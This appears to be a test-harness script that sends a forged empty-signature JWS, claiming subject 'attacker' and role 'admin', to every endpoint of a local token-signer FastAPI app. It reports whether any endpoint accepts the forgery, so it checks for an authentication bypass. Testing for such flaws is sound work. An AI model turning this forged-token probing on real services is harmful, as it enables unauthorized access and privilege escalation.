"""Send the forged empty-signatures JWS to every token-signer endpoint.

Usage: <app>/.venv/bin/python verify_trigger.py <app_dir>
Prints ACCEPTED ... and exits 0 if any response treats the forged claims as a
verified identity; otherwise prints REJECTED ... and exits 1.
"""
import base64
import json
import os
import sys

app_dir = os.path.abspath(sys.argv[1] if len(sys.argv) > 1 else ".")
sys.path.insert(0, os.path.join(app_dir, "src"))

from fastapi.routing import APIRoute  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

from token_signer.app import app  # noqa: E402

here = os.path.dirname(os.path.abspath(__file__))
with open(os.path.join(here, "input.json")) as fh:
    forged_text = fh.read().strip()
forged = json.loads(forged_text)


def _strings(obj):
    if isinstance(obj, dict):
        for v in obj.values():
            yield from _strings(v)
    elif isinstance(obj, list):
        for v in obj:
            yield from _strings(v)
    elif isinstance(obj, str):
        yield obj


def _compact_payload(s):
    parts = s.split(".")
    if len(parts) != 3:
        return None
    try:
        return json.loads(base64.urlsafe_b64decode(parts[1] + "=" * (-len(parts[1]) % 4)))
    except Exception:
        return None


def treats_as_identity(resp):
    """True if a 2xx response carries the forged subject/role, directly or in a minted token."""
    if not 200 <= resp.status_code < 300:
        return False
    try:
        body = resp.json()
    except ValueError:
        return "attacker" in resp.text
    for s in _strings(body):
        if s == "attacker":
            return True
        payload = _compact_payload(s)
        if isinstance(payload, dict) and (payload.get("sub") == "attacker" or payload.get("role") == "admin"):
            return True
    return False


client = TestClient(app)
header_sets = [
    {"Authorization": f"Bearer {forged_text}"},
    {"Authorization": f"Bearer {forged_text}", "X-Caller-Service": "orders"},
]
attempts = []
for route in app.routes:
    if not isinstance(route, APIRoute):
        continue
    for method in sorted(route.methods):
        for headers in header_sets:
            attempts.append((method, route.path, headers, None))
            if method in {"POST", "PUT", "PATCH"}:
                attempts.append((method, route.path, headers, forged))
                attempts.append((method, route.path, headers, {"token": forged_text}))

for method, path, headers, body in attempts:
    kwargs = {"headers": headers}
    if body is not None:
        kwargs["json"] = body
    resp = client.request(method, path, **kwargs)
    if treats_as_identity(resp):
        print(f"ACCEPTED {method} {path} -> {resp.status_code} {resp.text[:200]}")
        sys.exit(0)

print(f"REJECTED no endpoint verifies tokens ({len(attempts)} requests)")
sys.exit(1)
